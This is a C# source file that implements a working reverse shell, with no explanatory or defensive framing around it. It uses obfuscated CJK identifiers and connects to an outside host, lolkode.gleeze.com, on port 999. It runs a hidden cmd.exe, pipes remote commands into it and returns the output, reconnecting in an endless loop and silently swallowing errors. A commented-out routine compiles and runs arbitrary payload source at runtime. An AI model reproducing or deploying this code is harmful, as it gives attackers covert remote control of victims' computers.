using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace Rev3Rs3
{
    class Prg
    {
        static string 倰偲儯 = "lolkode.gleeze.com";
        static int 倰偲儯働 = 999;
        static int 倰偲儯働俯 = Convert.ToInt32("1000");
        static StreamWriter 倰偲儯働俯倃;
        static void Main(string[] args)
        {
            while (true)
            {
                倰偲儯働俯倃伔();
                System.Threading.Thread.Sleep(倰偲儯働俯);
            }
        }
        static void 倰偲儯働俯倃伔()
        {
            try
            {
                using (TcpClient 倰偲儯働俯倃伔伵僨亚 = new TcpClient(倰偲儯, 倰偲儯働))
                {
                    using (Stream stream = 倰偲儯働俯倃伔伵僨亚.GetStream())
                    {
                        using (StreamReader _reader = new StreamReader(stream))
                        {
                            倰偲儯働俯倃 = new StreamWriter(stream);
                            StringBuilder 倰偲儯働俯倃伔伵僨 = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(倰偲儯働俯倃伔伵);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (倰偲儯働俯倃伔伵僨亚.Connected)
                            {
                                倰偲儯働俯倃伔伵僨.Append(_reader.ReadLine());
                                //倰偲儯働俯倃伔伵僨.Append("\n");
                                p.StandardInput.WriteLine(倰偲儯働俯倃伔伵僨);
                                倰偲儯働俯倃伔伵僨.Remove(0, 倰偲儯働俯倃伔伵僨.Length);
                            }
                            System.Threading.Thread.Sleep(5000);
                            Main(null);
                        }
                    }
                }
            }
            catch { }
        }
        private static void 倰偲儯働俯倃伔伵(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder _HOut = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    _HOut.Append(outLine.Data);
                    倰偲儯働俯倃.WriteLine(_HOut);
                    倰偲儯働俯倃.Flush();
                }
                catch { }
            }
        }
        /*
        private bool CompilePayload(string SourceCode,string NameSpaceDotClass,string EntryMethodName,object[] _params)
        {
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults results = provider.CompileAssemblyFromSource(new System.CodeDom.Compiler.CompilerParameters(), SourceCode);
            if (results.Errors.Count > 0)
            {
                return false;
            }
            results.CompiledAssembly.GetType(NameSpaceDotClass).GetMethod(EntryMethodName).Invoke(null, _params);
            return true;
        }
        */
    }
}
